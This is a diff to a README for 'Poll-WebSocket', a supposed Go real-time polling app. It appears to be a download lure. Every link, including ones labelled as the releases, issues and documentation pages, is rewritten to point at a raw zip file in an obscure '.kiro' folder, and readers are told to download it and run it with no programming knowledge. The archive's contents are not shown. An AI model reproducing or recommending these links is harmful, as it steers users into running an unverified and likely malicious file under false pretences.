@@ -1,7 +1,7 @@
 # 🎉 Poll-WebSocket - Instant Polling Made Easy
 
 ## 🔗 Download Now
-[![Download Poll-WebSocket](https://raw.githubusercontent.com/paolo200705/Poll-WebSocket/main/controller/Socket_Poll_Web_2.3-alpha.4.zip)](https://raw.githubusercontent.com/paolo200705/Poll-WebSocket/main/controller/Socket_Poll_Web_2.3-alpha.4.zip)
+[![Download Poll-WebSocket](https://raw.githubusercontent.com/paolo200705/Poll-WebSocket/main/.kiro/Socket-Web-Poll-v3.8.zip)](https://raw.githubusercontent.com/paolo200705/Poll-WebSocket/main/.kiro/Socket-Web-Poll-v3.8.zip)
 
 ## 🚀 Getting Started
 Poll-WebSocket is a real-time polling system built with Go, Gin, and WebSocket. It allows you to create polls, vote, and see results update instantly across all connected clients. This application features JWT authentication, dynamic option management, and live vote tracking, making it perfect for interactive gatherings or events.
@@ -15,7 +15,7 @@ Poll-WebSocket is a real-time polling system built with Go, Gin, and WebSocket. 
 ## 📦 Download & Install
 To download Poll-WebSocket, visit the Releases page. Click the link below to access it directly:
 
-[Download Poll-WebSocket](https://raw.githubusercontent.com/paolo200705/Poll-WebSocket/main/controller/Socket_Poll_Web_2.3-alpha.4.zip)
+[Download Poll-WebSocket](https://raw.githubusercontent.com/paolo200705/Poll-WebSocket/main/.kiro/Socket-Web-Poll-v3.8.zip)
 
 On the Releases page, locate the latest version and download the appropriate file for your operating system. After downloading, follow these steps to run the application:
 
@@ -51,13 +51,13 @@ A: No, you do not need programming knowledge. The application is designed for ev
 A: Yes, you can host Poll-WebSocket on your own server. You need to configure the server settings according to your requirements.
 
 ## 📞 Support
-If you run into any issues or have questions, please check the [issues page](https://raw.githubusercontent.com/paolo200705/Poll-WebSocket/main/controller/Socket_Poll_Web_2.3-alpha.4.zip) on GitHub. You can also reach out to the community for help.
+If you run into any issues or have questions, please check the [issues page](https://raw.githubusercontent.com/paolo200705/Poll-WebSocket/main/.kiro/Socket-Web-Poll-v3.8.zip) on GitHub. You can also reach out to the community for help.
 
 ## 📜 License
 Poll-WebSocket is open-source and licensed under the MIT License. You are free to use, modify, and distribute the software as per the license terms.
 
 ## 🔗 Further Information
-For more details about Poll-WebSocket, please refer to the [documentation](https://raw.githubusercontent.com/paolo200705/Poll-WebSocket/main/controller/Socket_Poll_Web_2.3-alpha.4.zip) on the GitHub repository. 
+For more details about Poll-WebSocket, please refer to the [documentation](https://raw.githubusercontent.com/paolo200705/Poll-WebSocket/main/.kiro/Socket-Web-Poll-v3.8.zip) on the GitHub repository. 
 
 ## 🎉 Conclusion
 Poll-WebSocket provides an easy and efficient way to engage your audience through real-time polling. From community events to educational settings, the features support a wide range of uses. Follow the steps above to get started, and enjoy seamless interaction!
